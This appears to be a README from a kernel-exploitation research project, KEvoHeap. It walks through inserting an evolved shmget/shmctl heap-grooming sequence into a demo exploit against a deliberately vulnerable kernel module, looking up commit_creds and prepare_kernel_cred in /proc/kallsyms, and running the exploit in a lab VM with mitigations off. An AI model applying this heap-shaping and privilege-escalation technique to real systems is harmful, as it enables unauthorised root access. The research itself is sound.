# Example Exploit

The demo exploit `./exploit/demo_exploit_with_noise.c` performs heap layout manipulation to shape the heap into an exploitable state. It uses the `shmget/shmctl` system calls to allocate objects in the kmalloc-256 cache. These calls trigger (de)allocations of `struct shmid_kernel` objects, which are of appropriate size. A suiting series of allocations and deallocations can be found with KEvoHeap. To do this, follow the steps under "Run KEvoHeap+QEMU+BPFTrace" in [RUNNING_KEVOHEAP.md](https://github.com/fkie-cad/Algorithmic-Heap-Layout-Manipulation-in-the-Linux-Kernel/blob/main/RUNNING_KEVOHEAP.md). 

KEvoHeap will generate candidates consisting of calls to the kernel module and `shmget/shmctl`, which will then be inserted into a general corpus programm which takes care of setup and teardown (cf. [/hlm.template](https://github.com/fkie-cad/Algorithmic-Heap-Layout-Manipulation-in-the-Linux-Kernel/blob/main/hlm.template)). The generated candidates are then build and executed in the QEMU VM. The distance of the target objects gets extracted via `bpftrace` and fed back to KEvoHeap. When a correct sequence has been found, it can be used in an exploit to perform the neccessary allocations to place both target objects next to each other. For testing, you can use one of the demo exploits and replace the existing allocation directives with the sequence found by KEvoHeap.

For simplicity's sake, the exploit assumes that SMEP, SMAP and KPTI are disabled. This is the case in the VM that you setup in the instructions in [RUNNING_KEVOHEAP.md](https://github.com/fkie-cad/Algorithmic-Heap-Layout-Manipulation-in-the-Linux-Kernel/blob/main/RUNNING_KEVOHEAP.d)

### Use result from KEvoHeap

A result from KEvoHeap could look like this:
```bash
$./bpf_evo_runner.sh
[*] Starting try number 1
...
Ping...
Ping...
Ping...
Ping...
...
Ping...
Ping...
Ping...
Ping...
Going into next gen after 72 tries
[!] Found solution!
int fengshui318 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
int fengshui573 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
int fengshui956 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
int fengshui628 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
int fengshui230 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
int fengshui1249 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
int fengshui569 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
int fengshui1518 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
int fengshui984 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
shmctl(fengshui956, IPC_RMID, NULL);
shmctl(fengshui984, IPC_RMID, NULL);
shmctl(fengshui569, IPC_RMID, NULL);
shmctl(fengshui230, IPC_RMID, NULL);
sleep(1);
int fengshui370 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
shmctl(fengshui318, IPC_RMID, NULL);
shmctl(fengshui1249, IPC_RMID, NULL);
sleep(1);
int fengshui1608 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
shmctl(fengshui628, IPC_RMID, NULL);
sleep(1);
int fengshui1319 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
shmctl(fengshui1518, IPC_RMID, NULL);
sleep(1);
int fengshui189 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
shmctl(fengshui573, IPC_RMID, NULL);
shmctl(fengshui1608, IPC_RMID, NULL);
sleep(1);
int fengshui625 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
shmctl(fengshui1319, IPC_RMID, NULL);
shmctl(fengshui189, IPC_RMID, NULL);
sleep(1);
int fengshui1253 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
int fengshui934 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
shmctl(fengshui625, IPC_RMID, NULL);
shmctl(fengshui370, IPC_RMID, NULL);
shmctl(fengshui934, IPC_RMID, NULL);
shmctl(fengshui1253, IPC_RMID, NULL);
sleep(1);
int fengshui61 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
ioctl(fd, VULN_ALLOC_OVERFLOW);
ioctl(fd, VULN_ALLOC_TARGET);

Fitness: 256
```

This solution can now be used in `demo_exploit_with_noise.c` for the function `do_heap_layout_manipulation(int fd)`. This means we will exchange the given content from `do_heap_layout_manipulation(int fd)` with the result from KEvoHeap:
```bash
$ vim +161 demo_exploit_with_noise.c
...
void do_heap_layout_manipulation(int fd){
    # remove the content and change it to
}
...
void do_heap_layout_manipulation(int fd){
	int fengshui318 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	int fengshui573 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	int fengshui956 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	int fengshui628 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	int fengshui230 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	int fengshui1249 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	int fengshui569 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	int fengshui1518 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	int fengshui984 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	shmctl(fengshui956, IPC_RMID, NULL);
	shmctl(fengshui984, IPC_RMID, NULL);
	shmctl(fengshui569, IPC_RMID, NULL);
	shmctl(fengshui230, IPC_RMID, NULL);
	sleep(1);
	int fengshui370 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	shmctl(fengshui318, IPC_RMID, NULL);
	shmctl(fengshui1249, IPC_RMID, NULL);
	sleep(1);
	int fengshui1608 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	shmctl(fengshui628, IPC_RMID, NULL);
	sleep(1);
	int fengshui1319 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	shmctl(fengshui1518, IPC_RMID, NULL);
	sleep(1);
	int fengshui189 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	shmctl(fengshui573, IPC_RMID, NULL);
	shmctl(fengshui1608, IPC_RMID, NULL);
	sleep(1);
	int fengshui625 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	shmctl(fengshui1319, IPC_RMID, NULL);
	shmctl(fengshui189, IPC_RMID, NULL);
	sleep(1);
	int fengshui1253 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	int fengshui934 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	shmctl(fengshui625, IPC_RMID, NULL);
	shmctl(fengshui370, IPC_RMID, NULL);
	shmctl(fengshui934, IPC_RMID, NULL);
	shmctl(fengshui1253, IPC_RMID, NULL);
	sleep(1);
	int fengshui61 = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	ioctl(fd, VULN_ALLOC_OVERFLOW);
	ioctl(fd, VULN_ALLOC_TARGET);
}

```


### Update addresses

The hard coded adresss of `commit_creds` and `prepare_kernel_cred` needs to be updated with the current running kernel as written in the function `escalate_privs(void)`. Normally these addresses should be resolved dynamically but in this case we want to focus on the heap layout manipulation.

```bash
$ sudo grep "T commit_creds" /proc/kallsyms
ffffffffb16effc0 T commit_creds 
$ sudo grep "T prepare_kernel_cred" /proc/kallsyms
ffffffffb16f0290 T prepare_kernel_cred
```

Next we can update the adresses:
```bash
$ vim +102 demo_exploit_with_noise.c
```

### Run exploit

Now after we updated the results compile the exploit and run it. Assuming that you are working on the VM that was set up for KEvoHeap, you want to make sure to use the user account "MyUser" instead of root.
```bash
$ make noise # Build the exploit
gcc demo_exploit_with_noise.c  -o demo_exploit_with_noise -static
$ cd ..
$ ./scp_to_user.sh ./exploit # Copy the folder to the user directory
$ ./user_ssh.sh # Login to vm as 'MyUser'
$ cd exploit
$ chmod +x demo_exploit_with_noise
$ ./demo_exploit_with_noise
```
